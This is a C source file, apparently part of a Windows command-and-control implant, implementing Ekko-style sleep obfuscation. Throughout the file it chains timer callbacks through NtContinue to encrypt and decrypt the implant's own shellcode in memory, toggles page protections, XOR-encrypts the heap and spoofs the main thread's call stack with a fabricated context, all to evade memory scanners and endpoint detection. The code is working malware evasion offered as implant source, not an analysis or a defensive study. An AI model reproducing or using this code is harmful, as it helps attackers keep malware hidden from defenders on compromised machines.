#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Sleep.h>
#include <Spoof.h>

#define EKKO_DELAY_MS  100
#define EKKO_XOR_KEY   0xC0FFEE1337DEADULL

#define CRYPT_OPT_SAME_PROCESS 0

DECLFN void Sleep_Ekko( ULONG ms )
{
    G_AGENT;
    if ( ms == 0 ) return;

    if ( !Self->Cryptbase.SystemFunction040 || !Self->Cryptbase.SystemFunction041 ) {
        HeapCrypt( EKKO_XOR_KEY );
        Self->Krnl32.Sleep( ms );
        HeapCrypt( EKKO_XOR_KEY );
        return;
    }

    HANDLE    Queue     = nullptr;
    HANDLE    Timer     = nullptr;
    HANDLE    EvStart   = nullptr;
    HANDLE    EvEnd     = nullptr;
    PVOID     OldProt   = nullptr;
    NTSTATUS  st;
    UINT16    ic        = 0;
    ULONG     delay     = 0;

    // 12 slots: 7 base + up to 3 spoof steps + margin
    CONTEXT*  CtxCapture = nullptr;
    HANDLE    EvCapture  = nullptr;
    CONTEXT*  Ctx        = nullptr;

    // sleep-time stack spoof (must be declared before first goto)
#if PAIN_STACK_SPOOF
    CONTEXT*  CtxMain   = nullptr;
    CONTEXT*  CtxFake   = nullptr;
    PVOID     FakeStack = nullptr;
    ULONG_PTR fakeRsp   = 0;
    BOOL      doSpoof   = FALSE;
#endif

    CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    Ctx        = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, 12 * sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );

    if ( !CtxCapture || !Ctx ) goto _fallback;

    // sleep-time stack spoof setup
#if PAIN_STACK_SPOOF

    if ( Self->Config.MainThreadHandle                   &&
         Self->Spf.Setup.Gadget.Ptr                     &&
         Self->Spf.Setup.Second.Ptr                     &&
         Self->Spf.Setup.First.Ptr                      &&
         Self->Spf.Setup.SleepFsGadget > sizeof(PVOID)  &&
         Self->Spf.Setup.SleepFsSecond > sizeof(PVOID)  &&
         Self->Spf.Setup.SleepFsFirst  > sizeof(PVOID) )
    {
        CtxMain   = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
        CtxFake   = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
        FakeStack = Self->Krnl32.VirtualAlloc( nullptr, 0x2000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );

        if ( CtxMain && CtxFake && FakeStack ) {
            // Build fake stack using REAL (unpadded) UNWIND_INFO sizes so the stack
            // walker finds each return address at exactly the right offset.
            ULONG_PTR fsg  = Self->Spf.Setup.SleepFsGadget;
            ULONG_PTR fs2  = Self->Spf.Setup.SleepFsSecond;
            ULONG_PTR fs1  = Self->Spf.Setup.SleepFsFirst;
            ULONG_PTR base = (ULONG_PTR)FakeStack + 0x2000;

            *(ULONG_PTR*)(base - 8)             = 0;                           // NULL terminator
            *(ULONG_PTR*)(base - 8 - fs1)       = Self->Spf.Setup.First.Ptr;  // RtlUserThreadStart+0x21
            *(ULONG_PTR*)(base - 8 - fs1 - fs2) = Self->Spf.Setup.Second.Ptr; // BaseThreadInitThunk+0x14
            fakeRsp                              = base - 8 - fs1 - fs2 - fsg;
            *(ULONG_PTR*)fakeRsp                 = Self->Spf.Setup.Gadget.Ptr; // kernel32 gadget (leaf)

            // Fake context: thread appears blocked in NtSignalAndWaitForSingleObject
            // with a clean thread-start call chain below it
            Mem_Set( CtxFake, 0, sizeof(CONTEXT) );
            CtxFake->ContextFlags = CONTEXT_FULL;
            CtxFake->Rsp = fakeRsp;
            CtxFake->Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSignalAndWaitForSingleObject;

            // ContextFlags for real context capture (filled by NtGetContextThread at runtime)
            CtxMain->ContextFlags = CONTEXT_ALL;

            doSpoof = TRUE;
        }
    }
#endif

    st  = Self->Ntdll.NtCreateEvent( &EvCapture, EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvStart,   EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvEnd,     EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    if ( !NT_SUCCESS(st) || !EvCapture || !EvStart || !EvEnd ) goto _fallback;

    st = Self->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( !NT_SUCCESS(st) || !Queue ) goto _fallback;

    // capture a timer pool thread's CONTEXT to seed all chain frames
    CtxCapture->ContextFlags = CONTEXT_ALL;
    st  = Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Ntdll.RtlCaptureContext,
            CtxCapture, EKKO_DELAY_MS, 0, WT_EXECUTEINTIMERTHREAD );
    st |= Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Krnl32.SetEvent,
            EvCapture, EKKO_DELAY_MS * 2, 0, WT_EXECUTEINTIMERTHREAD );
    if ( !NT_SUCCESS(st) ) goto _fallback;

    Self->Ntdll.NtWaitForSingleObject( EvCapture, FALSE, nullptr );

    for ( int i = 0; i < 12; i++ ) {
        Mem_Copy( &Ctx[i], CtxCapture, sizeof(CONTEXT) );
        Ctx[i].Rsp -= sizeof(PVOID);
    }

    delay = EKKO_DELAY_MS * 3;

    // 0: wait for main thread signal
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = (DWORD64)EvStart;
    Ctx[ic].Rdx = (DWORD64)INFINITE;
    Ctx[ic].R8  = (DWORD64)FALSE;
    ic++;

#if PAIN_STACK_SPOOF
    if ( doSpoof ) {
        // 1: save main thread's real context
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtGetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxMain;
        ic++;

        // 2: apply fake context - stack now looks like a clean thread-start wait
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxFake;
        ic++;
    }
#endif

    // 3: flip shellcode to RW
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)PAGE_READWRITE;
    Ctx[ic].R9  = (DWORD64)&OldProt;
    ic++;

    // 4: encrypt shellcode
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction040;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
    ic++;

    // 5: actual sleep
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = (DWORD64)(LONG_PTR)-1;
    Ctx[ic].Rdx = (DWORD64)ms;
    Ctx[ic].R8  = (DWORD64)FALSE;
    ic++;

    // 6: decrypt shellcode
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction041;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
    ic++;

    // 7: restore RX
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)PAGE_EXECUTE_READ;
    Ctx[ic].R9  = (DWORD64)&OldProt;
    ic++;

#if PAIN_STACK_SPOOF
    if ( doSpoof ) {
        // 8: restore main thread's real context BEFORE signaling EvEnd
        //    so it resumes from NtSignalAndWaitForSingleObject with the correct RSP
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxMain;
        ic++;
    }
#endif

    // 9: signal done
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.SetEvent;
    Ctx[ic].Rcx = (DWORD64)EvEnd;
    ic++;

    for ( UINT16 i = 0; i < ic; i++, delay += EKKO_DELAY_MS ) {
        Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Ntdll.NtContinue,
            &Ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD );
    }

    HeapCrypt( EKKO_XOR_KEY );
    Self->Ntdll.NtSignalAndWaitForSingleObject( EvStart, EvEnd, FALSE, nullptr );
    HeapCrypt( EKKO_XOR_KEY );

    goto _cleanup;

_fallback:
    HeapCrypt( EKKO_XOR_KEY );
    Self->Krnl32.Sleep( ms );
    HeapCrypt( EKKO_XOR_KEY );

_cleanup:
    if ( Queue )      Self->Ntdll.RtlDeleteTimerQueue( Queue );
    if ( EvCapture )  Self->Ntdll.NtClose( EvCapture );
    if ( EvStart )    Self->Ntdll.NtClose( EvStart );
    if ( EvEnd )      Self->Ntdll.NtClose( EvEnd );
    if ( CtxCapture ) Self->Krnl32.VirtualFree( CtxCapture, 0, MEM_RELEASE );
    if ( Ctx )        Self->Krnl32.VirtualFree( Ctx,        0, MEM_RELEASE );
#if PAIN_STACK_SPOOF
    if ( CtxMain )    Self->Krnl32.VirtualFree( CtxMain,   0, MEM_RELEASE );
    if ( CtxFake )    Self->Krnl32.VirtualFree( CtxFake,   0, MEM_RELEASE );
    if ( FakeStack )  Self->Krnl32.VirtualFree( FakeStack, 0, MEM_RELEASE );
#endif
}
